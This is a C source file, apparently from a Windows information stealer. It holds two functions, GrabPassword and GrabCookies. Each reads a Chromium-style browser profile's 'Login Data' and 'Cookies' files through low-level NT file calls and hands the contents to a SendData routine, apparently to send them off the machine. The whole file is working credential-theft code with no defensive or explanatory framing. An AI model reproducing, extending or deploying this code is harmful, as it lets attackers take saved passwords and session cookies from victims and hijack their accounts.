#include "../include/MemoryUtils.h"
#include "../include/StringUtils.h"
#include "../include/SendData.h"
#include "../include/PathOps.h"
#include "../include/FileIO.h"


void GrabPassword(unsigned short *BrowserPath) {
    HANDLE              FileHandle          = {0};
    UNICODE_STRING      PathUnicode         = {0};
    OBJECT_ATTRIBUTES   PathObj             = {0};
    IO_STATUS_BLOCK     IOstatus            = {0};
    char                FileSizeString[20]  = {0};
    unsigned char      *buffer              = {0};
    unsigned short      TempPath[250]       = {0};
    int                 FileSize            = 0;
    int                 FullBufferSize      = 0;
    int                 PathSize            = lenW(BrowserPath);

    /*length * 2 because its wide character string*/
    MovMemory(BrowserPath, TempPath, PathSize * 2);
    ConcatStringW(TempPath, L"\\Default\\Login Data", PathSize);

    InitPathObj(TempPath, &PathObj, &PathUnicode);
    InitFile(&FileHandle, FILE_READ_DATA | SYNCHRONIZE, &PathObj, &IOstatus, FILE_OPEN);

    FileSize = FileSizeG(FileHandle, &IOstatus);
    FullBufferSize = TotalBufferLength(L"Login Data", FileSize);
    
    buffer = AllocMemory(FullBufferSize);
    if (buffer == NULL) {
        return;
    }

    IntToString(FileSizeString, FileSize);

    if (SendData(FileHandle, "Login Data", FileSize, FileSizeString, buffer, NULL, TRUE)) {
        return;
    }
}

void GrabCookies(unsigned short *BrowserPath) {
    UNICODE_STRING      PathUnicode         = {0};
    OBJECT_ATTRIBUTES   PathObj             = {0};
    IO_STATUS_BLOCK     IOstatus            = {0};
    HANDLE              FileHandle          = {0};
    char                FileSizeString[20]  = {0};
    unsigned char      *buffer              = {0};
    unsigned short      TempPath[250]       = {0};
    int                 FileSize            = 0;
    int                 FullBufferSize      = 0;
    int                 PathSize            = lenW(BrowserPath);

    /*length * 2 because its wide character string*/
    MovMemory(BrowserPath, TempPath, PathSize * 2);
    ConcatStringW(TempPath, L"\\Default\\Network\\Cookies", PathSize);

    InitPathObj(TempPath, &PathObj, &PathUnicode);
    InitFile(&FileHandle, FILE_READ_DATA | SYNCHRONIZE, &PathObj, &IOstatus, FILE_OPEN);

    FileSize = FileSizeG(FileHandle, &IOstatus);
    FullBufferSize = TotalBufferLength(L"Cookies", FileSize);

    buffer = AllocMemory((SIZE_T)FullBufferSize);
    if (buffer == NULL) {
        return;
    }

    IntToString(FileSizeString, FileSize);

    if (SendData(FileHandle, "Cookies", FileSize, FileSizeString, buffer, NULL, TRUE)) {
        return;
    }
}